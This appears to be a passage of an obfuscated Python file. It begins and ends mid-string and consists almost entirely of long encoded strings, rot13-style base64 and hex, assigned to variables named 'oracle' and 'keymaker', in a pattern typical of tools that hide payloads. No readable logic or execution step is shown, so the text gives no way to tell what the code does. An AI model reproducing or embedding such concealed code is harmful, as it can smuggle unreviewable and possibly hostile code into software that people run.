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'
oracle = 'M0MjcyNTU3NTM2NmEzMzY1NTQzODUwNjU3OTc5MzA1Mjc1NzczMzRjNzI0NjY2Nzk2NjczNmY0ZTQxMzc1ODc3NTQ1NDJmNjg3NTU5NWEzMDM3N2EzMDUwNmY2NTRhNjY1MTQ0MzA2NzMzNmY2MzJiNzg2NTZmNzEzMzZjMmY3ODJmMmY2YTM5MzkyYjc1NzQzMjRlNzg0ZjU0NDU1YTMxNGY1Mzc0Mzc1NTZmNjY2Njc5NzQ0ZTMyNTE0ZDZjNDM0YTUzMzc0NzZjNzY2OTcxNmQ0YzcxNDU1MjM4N2E2MTRkNmY0Mjc0Mzg2MzU3NzI3NzQ3NzE2ZDdhMzU3OTQ1NjE0MjJiNmQ1MDZmNmY2YTc5NmQ0MTRmNDE0OTQ1NGU2MzM3NTE3ODM1Nzk2Nzc3NzU0MTZmNDQzNTUxNmE1NTRhNWE0MTYzNTE2YjYyNDg0NTZjNTI1MDc4NWE1NDUyNDg0MTZiNDQzMjcwNjY2ODUzNGU2MjYyNGYzODc5MzU2MzcyNmQ0OTMyMzU1MTY2NDg0NDU1NTQ2YjYxNzA0ODQ0MzU0NzRkMzU2NzM2MzE0ZDUzNjc1NzQ2NTc2MTU2NzM2YzQ4NDYzNTZmNzE3NTRmNjM2YTdhNzc2YzQ4NjM0ODc4MzAzMjJmNDE1MjM3NDE3ODQ4NjE0YjQzNDk1OTVhMzQzNTU1Nzk2YzY5NzI0NzUwNDM0NTY1Njc0NzZjNDI3OTYxNjgzODRhNTc0ZTYxNjc0MTU0NDg0NTQzNDY1MTU0NjIzNTRjNTEzMjUwNmM3MDU1NDI2YzRkNzgzOTc5Mzc0YzZhNjU1MjZjNjczMDRiMzI2NDZkNGE3MzMxNTc1MDM3NDg0YTUyNGY1NTRjNWE3NzcyNDEzNTcxNmI0ZDMyNTU0ZjcxNjEzNjRkNDY1NjQzNDgyZjJmNmY2ZjMyNzc2MzY2NTk0ODcxNzk0YTUxNjI1MDZkMzU2YzUzNzMzOTMyNzg0ODVhMzQ2YTcxNGQ1YTY2MzY3NTcwNDE3MDZiNzc0NDc0NmE0MzcyNmQ3MDU0NTUzNzYzNjc0NDdhMzcyYjY4NTM3NzZkNTU0NzRiNzg1NDU1MmY3MjQyMzY1NjMxNTk0NTZmNmI0YjRhNzk2MTMwNzM0YTU1NGY3MzY3NTA1NjQyNGEzOTVhNDE0NDcxNDMzMjJmMzMzNDM4NmE2YzYzMzYzMjUwNjk3NzY1NmQ0OTU0NDg0NjQ1NGQ2NTQ0NmY0ZTY5NDEyYjZmNGI2YTM2NWE3MTMzMzI0YzQ4NjU0ZTU5MzY0ZjQ3Njg3ODQ0NTk1OTc1MmIzMDRjNjI0MjU2NDI3ODUxNzU2NzUzNGY2NjQ3NzQ1MTM2MzM2NzRjNmUzNDM5MzA2ZjQ3NzQ1MTRmNGU1MzRkNGI1YTY5NzM1MjM5NjQ1NzQ3NTkzNTZkNjk2YjZjNTQ0ZDQ1NDY3MDY3MzEzNTQxNzA1OTQ2MzgyYjQxNjc1ODMxNDYzNjRjNmEzMDZmNjI3MTYzNjY0MjZiNTQ3MDU0MzQzNDUzNTc0OTMxNGQ1NjU5NmUzMzQ1Njg0YjRkNDk3MDcwNTQ0NzJiNzI2NzQ4Mzg2ZjY1NGQ0ODRiNjE0MzU3NzE0MzY1NzI0NDRmNjU3YTM0Nzg3MDc3NTg3YTZiMmI2YTc4MzY0OTZhNmU2ZTU0NDIzMDQ0Mzk1MTc4NDg2YjUyNjg1ODUwNTkyYjRkNTk0YTJmNTE0Yzc4MzgzMTY3NTYzNDc3NTczMjc2NzE2YjMwNTgzMjVhNTk0YTRiNmY0ODY4NjM0ODQ0MzI1NTRmNDk3MDY4MzI2NjQ5NTI0MjM0Mzc3NDRkNTEyYjY2Mzc0NjQ4NjI0YzU5MzY0NTMyNDUzODRmNjY1MDc5NGQ1OTc3MzA2MzYzNTU0ODY1NmY0YTRiNDM3NTcwNDIzODRkNmU1NzU5MzEzNDU1NmE2MzQ2NDI2ZjYzNDI1MTRiNjY1YTUxMzQ1MzY4MmI1OTZiNzA1NTM5NmEzMjQxNjM1NDYxNDg1MTUyMmI1NzUxNGQyZjZiNTM0ODM3NmI3ODZjNTI0ZTQ4NGU1NzYzNjMyYjU0NDQ2Yzc3MzI0NTRiNGQ1OTM1Njk0ZTRmNTU0NTc4MzQ2NTY3NmQ2NjZjNjI3MjQxNjQ1NTUwNDk1MDc0NmU1OTJiNDk2NjZjNDY3NTc0MzA3YTM1MzQyYjUwMzk0YzRlNWEyYjM3NDQ0ZjU2NjQ1NzUyNzE2YTQ0MzQyYjc3NzQ0ODZhNDE0ODJmNTA2ZDU4NzA0OTY0NmY3NzZhNjQzOTY3NmEzOTc3NTA0YjRhNDY0ZTRkMzk2NDQ1NGUzMDM0NzI2ZjQ4MzY2ODMzNTQ0MTZlNDg0ZDM1NmY1MDZhNzMzNTc3NjQ0YTRkMzk2YTM3NDIzODU1NDYzMzM0NzU2MTQ3NzA1MTUwNTc2YjMyMzI0YzM5NmY0MTcyNjc3OTQyNzQ0ODZkNzI1NzZkNmIzNDRjNjkzNjU3NzczMTc4NTQ3MDRjNGM2ZTc5NmI3YTc0NTE3YTQ4NGU2YjcwNzQ3MTM4MzE1NTMxNGI0MjY1MzI3MjUxNTIzNjRjNzczMTM5Njc0MzQ2NTE1YTQ4MzM0Nzc3NDg2ZjQ4NTUzNDRmNGQ3MjQ1MzA1NDRjMzU0ODY1Njg0NjM4NDE0ZTUxNTMzMzZkNzQ2MTRiNzU3MDRkNDk3MTUwMzY3NTQ2NzYzMDQ0NzM2ZjRkMzA3ODVhNmQ1MDY4NmY2YjZlNDU1MzUyMzQ3OTY3NTY3MzQ2NzYyYjY1Njg3NDU5NDU2Zjc5NzI3Nzc2NTU0MTQ0Mzc2OTMxNTY1MjMxNmM2NzM4NjY3MzM0NDU0YjM4NjY2ZDMwNTEzMTc0NzA3NTdhNjYzNTUzNDY3YTRjNmIzOTU5NGE0YjY4NmI2ZjZjNDY3NTZkNDE0NDUwMzE0ZjZkNGY0YjQ1NTkzNzM0NGE3MjVhMzM3ODZjNGM0MzUyMzUzOTM5NTk2NzU5NGI3ODQyNzA0ODcyNmI3OTRlNGEzMzc1NmY2MTZjNDM1ODM1NmI3ODQ2NDEzMTMyNTE3MTYzNjg2YjRjMzQ3ODZhNGY0MjcxNDc2NjM4NjMzNDY1NmQ1OTM2NDk0ZTczNzgyYjc3NmM1NDMxNDM2NTRmNDczMTY3NTAzMDM2NGM0OTU4Nzg3NjQ3Njc1OTQ3NzA2ZDZhNjk3OTM5NGI1NzZkNDY3YTQ1NDY0NzQ1NjU1MDQyMzg1YTc1NTQ1MzQ2NmE0NzcxNTEyYjcxNzM2MzUyNGQzMzQzNGY2MTUyNDk2Nzc1Mzk1MTZkNTg3NzQ4NDE1NTYxMzY0NDZmMzI1YTUxNTI0YTZlNzE2Mjc2NDM1MjRkNDIyYjUyMzg2YzQ4NzU3ODQ1NjY0NDY1MmY2NzMxNmU2ODMyNzM1ODM5NTIzOTUwNjg0YzQ1NTU1NDdhNzc2ZTZlNDU1MTY2NmY3MzZhMzU3ODY3NTU0ZjMzMzI2YjQzNzY3NjQyMmI0OTM3NTUzMTQ4MmY2Njc0NjQ2NzMyNGM2NDY2NTM1MjM5NGQ1MzQ2NTA2NzVhMzQ2ODY2MzM2YTUyNmE0ODQ2NDU3NjQ5NTYzMTRkNTU2MzMxNDI2NDUxNGYzMzRiNmQ0ZTM2NzE0YjYyNmM0ZDY2NjM1NjUyNGI0Zjc3NTI2NjZmNjIzNDY3NjY2YTZkNjE2ZTMzNzc2YjU4NzI0ZDY1NDE0NzcxNzUzOTRjNTU1MDQ2Nzg1NjMwNDg0NzRhNGI1Nzc1NjczNzQxNDkzMzc1NGEyYjRhMzU1MTc5NjE1OTRiNTU3MDUyNjc2NjQ3NjI1NjY0NTQ1NzZhNTY0NzQ0NjE0MzQ1NzI3OTY1NzkyYjc3N2EzNjc4NTI0NTJiNjM0MjU2NDgzNzM2NDI1NzY3NDM2ZjQ1NjY0NzQxNzE3NzRkNTIzMjdhNjI2MTQ4NGY0MzVhNDE0MjU4MzQ3NzdhNmQ0YzJiN2E2NjUwNDk0NjU4Njk0ZDQ5MzM3YTQzNjE0NTMyNmM3NzQyNDUzMTU1Nzk1NjRlNzA3MDUxNjczNzZhNDg0NjUzNDc3MTJmMzQ2NjU1Mzk2MTVhNTc3MzU2MmI0MTcyMzk0MzM4MzU3MjY5NGY3NTczNjQzMjc3NjY2OTQ0NjYzMjc1NDE2YTYyMzM3NzQ4NmM1MTZjNTU0ZTM2NjI0NzUwNjk2ZDJmNzU0MTRiNDEzOTU1NGU2NjU0NGMzMTJiNTk2NzY1NmY3NjcxNDI3NzY3NDg3MjQ2NGY0ZDU0MmI1NDMyNGY0NDMyNmI2MTM0NDE0ZDcxNTQ2ZjJiNTA3NjQ3NzY2NzRmNzk2ODM5NTQ0MTY1NzI2ZTRkNTQyZjc3NDkzOTVhNTg1Mjc4NDQ2ZTM5NGE1NzUzNmI2NDY2NDY2NTUxNzY1NDQ0MzA2MjY3MzI2YjYyNTQ0MjMyNDI2ZTY2NDU1Mzc1NjM1OTZkNzA1NTRjNjg3OTM4NGQ3ODZhNDM2YjMxNGU1YTQ5NmY1NDZhNTE0ZDYzNWE0Yzc5NDY2NjdhNGM2YzQ1MzM2YTRhMmI0ZDQ2NTg0ZDYzNjg1NzMyNDgzOTQyNzQ1MTU0MzE2ZjcwNGI2NzY5NmQ3MjcxNDI2OTY3NTY1NDRlNGQ3NTZkNDU3MTJiNWE2ZDZmNDc0YjQ3MzY2NzZhNGY0NTZmNDgyZjMxNzU0ZTYyNTU2NTM5NDUzNzMwMzczMzQxMzg1MTY4MzQ0NDZlNDE0MTMxNDI1ODcwNmE1NzZkNmU3NTM4NDY1NTQ4NTQ2MTU4NTI2YzQ2NjU1MzZmNTQ0MTMxNzY3NDU1NTQzNjM0NTgzOTQzNDY2NDZhNDQ2ZjYxNmQzODQ5NDg2MTQ0NTk2Zjc2NzgyYjczMzU1NTJmNjU1YTZmNjc0MTcxNDQyYjY4NzE0ZjQ5NmY3NjYzNGI1NzQ4NGI2NjUyNGQ0ZTU4NTE1MTMzMmI3NDZlNzY0NTY1NzM2Nzc4MzU0MjY4NjM0NDM4MzQ2MTc1Njc3MjQ0Nzk3MDczMzk0NDZhNjQ0MjY3MzA3NDUxNjczNDcyNDg1MzY1Nzc2NjY3NDI2NjQxNDc0NjM5N2E0MjZlNjE2NzVhNjY3YTY1NDYzODQ1NzY2ZDY2Nzg2NjQ3NDQzODY2NTM0MTRiMzA1NDMyMzU2YjZlNGU1NjM4Njk1MDUxNGU1NTQzMzc2ZDc1NGIyYjMwN2E2ZTRhMzA3NzJmNGU3MzZhMmY0YjZiMzM0MjY4MzEzMjRjNTM2MzY0NTY1NTQ1NjMzMDY4NTQ0ODZlNzY0MTQyMzY1MjcyMzQ0ODRiNjg0Mjc3NDU3ODUyNjE1MDQxNjQ2NTc3NDY1YTQxNDg2MzJiNjYyYjczNTM1NjQ5NGQzNDY4NTE1MjZiNzk2ZDYyNGI0OTJiNTM0OTUwNzk0MTM0NjE3MjM1NDc2ODVhNTU3ODRlNTE1OTdhNmIyYjU4NTAyYjZkNDQ0NjU2NDYyYjc0NDY2NjRiNmI2ODUwMzAzMzZhNGM1YTM0NTU0ZDRlNDIzNjQ1NGUzOTQyMzA2MTQ4MzE0MTQ4Mzk0MjcyNjU1NzM4NDQ0MjUxMzEzNjQxNjQzNTRkNTY1MDUwNmUyYjRkNTg1NDQxNmU1NTU2NDU0MzMwNTk3OTcxNzI3OTU4NDc1YTczNDg0YzQ0NGY0YjM4MzAzNzYxMzA0MjQ0Njk0NDY2NmE1ODU1MmY2ZDY5NmYzMTMxMzc0YzZlMzk1NDRmNDY1MjZjNGQ3Nzc0NGMzMDc4NmM1MjM5NTg2ODQ3NDQ0ODU0NTA2YzZkNmU0YzRiNjU2NDRiNzA2ZTQ4NDk2NjUwMzgzOTU3NTY1YTdhMzQ0ZDY2MzA1MjYzMzQ1ODY5NDU3NTUwNzk2Yjc2NmY0MzcxNmY2NTMxNDQ1NTM0NmI0OTdhN2E2YjY2MzE2YzYzNjI0NzUwNjM1MjY3Nzg3MDZjNjczNTRiNGU0ZjRkNGMzNTRkMzUzNDQ0NGM3ODY4MzM1MTRiNTU3MjRlNTg1NTU5MzQzNDQ0MzYzMDY5Njg0ZTU0NTc1YTRiNGI2MzZiNGUzOTUxNTA0ODRhNmY2ZTMzNDM0MjJiNTI2YTdhNGY2YzY5NjU3MzYyNzA3NTYxN2E0NDZmNDc3NjU0NDIzODMzMmI0ZjcxNTcyZjM2NTE0YjZiNmUzODc5NGE2MjY2NWE2MTZlNmM2YzU0N2E2ZDU0NjY1ODQ0NzMzODdhNmM2NjZkNTQ0NjMxNTI1NjRmN2E1MTQxNDc2MjM5NGE1NTMyNzA3NDRiNDQ3OTczMzAzNDc5NWE1NDY1MzY2MzQyNzg2ZTY2NTg0MTczNTk3YTc5NGY2NDUxMmY1NDUwNDg0NzMzNGU2ZTc1NmQ0NTcxNmQ0YjU1NTM2ZjZhMzI0YzZiNDM3ODYyMzc0YTJiNGQ1NDM0NzQ0MzU3MzU2MTU1NzA2MTczNmI3YTc2NzU0ZjcxNDQ3MTZhNGI3ODVhNTA3NTQyNDI3OTZmNDQ2MzVhNWE2YTRiMmY3YTUwNmIzMzQyMzA1ODZiNzU1NTMyNmYzMjU0NTA1ODZiNjU0NDM3NmE1MDQxNDIzNDUwMzg0ODRmNzU1NDM1NDIyZjY3MzM0Yjc2NzM1OTY4N2E2YTY1NTI3MDM4NTQ3MzJmMzM3ODU2NDI1NjUxNzU3MDMzMzU1MzY1NmQ0NDJmNzM0NTUwNGEzMTQ3MzI1NzY5MzY2MTQxNmQ3MDcxNjE1NzMxNGM2MzQyNmQ2MTU4NzU0NzcwMzIzNTY5NzQ3ODU3NzUzNzZkMzgyYjZmNDc0YjRlNDg3YTVhMmY3NDZlNTg0NTRlMzk3MzU4MzM2OTRjNzU1MTQ4NDg0ZjRkMzQ3NzU4NTY0MjdhNzYzMDcyNDg2NTM4MzU2ZTY5NDU2NjVhMzY3MjU4NmU1MDRlNWE1NTQ5NTU2MjMyNDEzOTY2NzU2MjQ2MzEzMzQ5NDEyYjQ3NDIzOTczNzI1YTY0NTMzNTM4MzI0OTU4MmY3MTcxNmE0YjVhNDE1NjM1NDE0ODVhNDM3NDQyNTQ2NTRiNzI1OTQ4Nzk0NjQ1NDY1NDZjNmE0YjJmNjM0OTVhMzY2NTU3NTQyZjc3NjUzODc2NTYzMTQ4NGMzMjQzNTY0MzUzMzM0MzYzNDY0NjMxNjMzMjZiNDgyYjY5NjYyZjY3Njg1NTM2NWEzMDU4NjM0MjU4NGQ0ZDY3NzU1NTYyMmI2OTJmNzU1NzM2NTM0ZjZmMzY2YTY1MzA2MjM5NTIzOTM4NDQ1ODZiMzMyYjc4NzU3NTMxNmE0MzMxNTQ0ZTY1NjY2ZDQxNjM2ZjMwMzc2YTc1Njc2Mjc3NDI2NTZlMzU1MzcxNGE2ZTQzNzI3MTZlNjg0NzMxNDQ2YTc1NjIzNDQ0NzI3MTcxNTIzNDc3NTQ2ZTM2MzM2ZDZhNjE2NDRiMzQzODZmNGY3MjYxNzc2YzU0Nzk0NDUxMzE2ZTY1Nzk2NDM0MzA3NTcwNGI1ODM0MmI3MjcwNGM3NzMxNTE3Mjc0NmE3YTM3NmE2NzYxNmU2YzY3NTg3YTUzMzE2NjZhNDQyYjUzNTg2ZTUwNjY3MTRiNDYzMTM4NjI0MjQyNTU2MTY1NTUzNjY4MzUzMDM4Nzk1OTQ1NzE2MTc3Mzk2MzY3NDQ2MjU5MzMzMTQ5NTc0ZDUzMzQ3YTQ4NmIzNjVhNjE2MzY4MzI0ODUwNDg2NjUxNTY0NjUwNmI2MjYyNDQ1MDM0NmI2ZTM1NTIzMTM2NmY0YTZjMzM3YTQ4NTQ1NDZjNDY3NjU1MzUzODcxNDM0YjcyMzczNTU5Nzc0NDQ3MmI0YjcxNTM3MDczN2E0ZjMyNjYyYjUyNjg0NzY1NTA2NTc5NGM2YTQyNzQ1NjcwNzA0ZDc2NjI3MTcxMzI0MzYzNGUyYjU3Nzc0NDM2MzU0NDU5NmY0Zjc2MzI2ZDU4NzM1YTM3NmYzOTcxNTA1YTYzNGU3ODMzNTk1NDM1MzU1ODUyNzMzNTYxMzM2NzY1NmQ3NTQ3Mzg1OTY0MzI0Yjc0NDQzOTY5NDQ3Njc2NGE2YjRkNGYzNzJiNzU2OTcyMzY3MTc3MzY2YjY1NGQzOTU4NTI2NTQxNDg0ODQxMmY2YjM5NGM3YTQzNmY1MzZkMzM3YTY2NGU0YjMzNjEyYjcyNTI0MjU4Mzg2YTRiMmY0YjY3NmU0YzY1NGQ0YzMyNTUzODY3NGY2ZDUzNTY2MzM4NzY3NjMyNzMyYjM1NDY3NjQ3NzA3MTc5NmE2MjcyNjk3NzQ4NTg1NjU3NmMyYjY4NjY0NjM3NTQ1MjY2Nzk1MDZiNTk2MzZhNmU3MzRiNGY1MTQ5MzI2YjM3Nzg3OTUwNTk0ODJiNTQzMzY5NGU2OTJmMzk1MzM0Nzk0NjY1NDY2YjQ2Mzk3ODMzNTQ1MDU0MmI3YTc2NTkzNzJiNDQzOTQ0NjU1MTZhNzc0ZTJmNDgzODdhNmY1NDM4Njg2ZTQ1NGY0Njc5NGUzMTQ4NTc2OTM5Njk3NjU5Njc1YTQ2NzI1MzY5NTA3OTUxNjU1MTQ0NmQ3NDcyNGQ1NjMxNzE1MTJmN2E0NjU2NmQ1MDY0NGE0ZjRmMzU3MTZkNmE0MjcxNDU2ODcyNzY3NzQ2NjU3NzMxNGE0ZjQzN2EzMzM3NGQzMTQ2NjE0ZTZlMzA3OTc0MzU2ZTMyNTQ0MTM5NjYzMzU4NDk2MzY3NDQ2Yjc5MzQ2ZDZjNWE3MTYxNmQyYjQ0Mzk1ODQ0NjQ2MTY1NzYzNjZjNDM2ZDU0NzU0NTRiNDEyZjU5NTczNTZhNzY0ZDZiNGMzMTQyNjc0ZTUzNTg1NDM0NDM3NDc5NmE1ODc4NjU2NTU4NTU1YTdhMzk2YjQ3NzU1OTM1NDg1MDUxMzE0YjUwNTA3NzUwNGU1MTMzNzk0NDM1MzM1ODRkNDg1NzU5Mzg3NjU5NGUzNzMyMzM1NjZkNzA3Mjc0NDkzNTM1N2EyZjU3MzU3NTM5NDI1NjY2NTUzMTJiM'
keymaker = 'mHmZwMxAzL3ZGHjATH2AQExAwx0MQp2AQR0ZwLkAJR0ZmH3ZmR3BQL2AQx0BQWzAzV3ZGZ4AGD0BGp5ZmR0AGL2ZmD0AGpjAQZ3LGMyAzR0AGL1AGV2Zwp2AQZ3BGMyATL0MGZ3AQt2AwMzAwL2AGZ5AGR0MwMxAmHmBGH2AGHmBQH4AQt0AmD3AwV2MwDmZmZlLwL3AmV3AQLmAmtlLwEvAmVmZmDkAwxmZGL4Awx2ZGHmAzL2MwplAmLmZQquAmD1LGExAmR2Mwp2Awx3ZGMuZmt3Amp5ATH0BQZmA2R2LmD0AzZ1ZwZkAmV3AGp1AJRmZmpmZmZ1BQIuAmN0AwH4AGN2BGMyAwx0AmH2Zmt2MGpmAQD2BQMyAmt0ZwH1AQVmZwDkAGL2AwMuAGRmZwL2AwD1ZGZ3Awx0LGWvAGD0AQWvAQp3AQp5AGN1BGH0ZmL0AwD4ATZmAQL4AwL0MwZ4ZmZmBQEwZmH0BGEvAzRmAwExZmtmAmMuZmx1ZwH2AGx3BQD2ZmZ0MwD5ZzL2LGEvATZmAwZ1AmHmBQMuAGpmAwIuZmRmAwMzAmV3AmMzZzV2AQEwZmV0LwL2AGH3AwZmAzRmBGZ5ZzL3ZGZjZmx2LGLmZmL3BQHjATHlLwp5AQD2AmpjAmLmZGquAGt3AwHkAwL2MGWzAQt2MGpkZzL2MQWzAmL0AGL1ATD2LGL5AQx2AQL3Zmp2AGH1AmN1LGH5ATL1LGZ1AwV3BGH1AGp0ZwH5Zmx1AwZjAmt2LGEuAGp0ZGquAwx1AmZ5AQD2AGZ0AGDmBGHkAmH3ZwZ0AGZlMwExAmp1ZGZ0AGL1ZQZ1Awp1ZwL0Awp3ZwMuAmN2MGEwZmR3LGDkAGt0AQEuZmt3BQp1AQpmAmExZzV2ZmHjAwH3AQZ2AzHmZmMwATD0AmMyAwZ3ZmDkAwt2MwWvZmx3ZwHkZzL2MGL3Zmx3ZGD4AGNlMwLlAwL2AGD1Zmt2ZmWvAwH3AwH0AwZ1ZmZlAwL3AGD5AmV2BGEvAzZ3AmL4Zmp3LGp1AQRmBQZ4AGVmAQZmAmH0BGH4ATL0ZwH4AmL1BGEyATDmAGExAmLlLwLmAmp1Zwp3AmNmBQEwZmxmAmZ3AJR2LwZ2AwR2MwquAzZ2LGWzAwpmAmp2AGpmAGMzAwV0ZwH5ZmD2BGp1AQp3BGHmAmH1LGWzATD1BQZ2AGZlLwpkAwVlLwLkAmH2ZwDkATHmBQZ3AwV0MQp5AQxmBGpkAzH1ZQWzAzV0MQLmZmZ0LmH4ZmR0MQWzZmD0BGH5ZmHmBGpjATVmAGL1Amp1ZQH3AGL3ZGD1AmD2Zmp3Zmt3LGLmAQZ0Lwp4Amt3AmWvATL0BQpmAzH0LmDlZmZ2AGp1AQR3AmL0AGHmAmZ1AzZ2MGEzZmN3AGHlZmZ0MQD3Amt0AGZ4AmtmAGpjAGN0AGp4AGNlLwp5AQLlLwZkAwt1BQZjAQD0ZwD4AGD2MGHjAQZ1LGL5AGVmZmEvZmV2ZmEzAQp2ZwL4Amt2LwDkAmL2LwMuZmZ2LwEzAQD2ZmZ4AGt2ZmMxATH2AGD3AzH1ZQH1AzD2BGL1AzH0AGHlAmt0MGH4Awp3AQZ0AmR2LGMyZmD3ZmpmAmt2BQZ2ZzL1AQL1ATLmBQIuZmx0ZwEyAJR1ZmLmZmN2BGp4AmDmZGZ3Awt0LmD1AQD0AwZ0AQt1AQL5AwV0ZGEuAmx1Amp0ATHmBQMyZmZ3LGHkAGp0BQZkAmV3LGpkZmDmAmHkAwDmAwLkAQxmBQpmAwZ1ZmpjATRmZmH0AmL2MwEwATD0ZGZ3ATH0ZmZmAmL3AmZ0AQp0LmMxAQV2AmEvAmtmAQHjZmp0ZwEuAGR1AmZmAQD1LGp3ZmL3LGH4AzZ1AGZ0ATV2Mwp5AzH3BQD3AwZ3AGZ4AQR1AmH3AzDmAGEyZmZ2MQL4ZmH2LwHjZmV0MGZ0ATV0LwDmAGD3BGL4AGx3Zwp1AQVmZwL3AmN0MwEuAmL2AwWvAQVmZwp1ZmV1LGZ2AwV2BQMvZmp2BGIuZmD3BQH3AGR0BQD3AGD2BGL1AmZ0MQWvAQHmAGpjAQt1BQH5Awp0BGD4AmD3LGEzAJR2AmZ2AwxmAGLmAQL2LGMyAQD0AwquAwZ3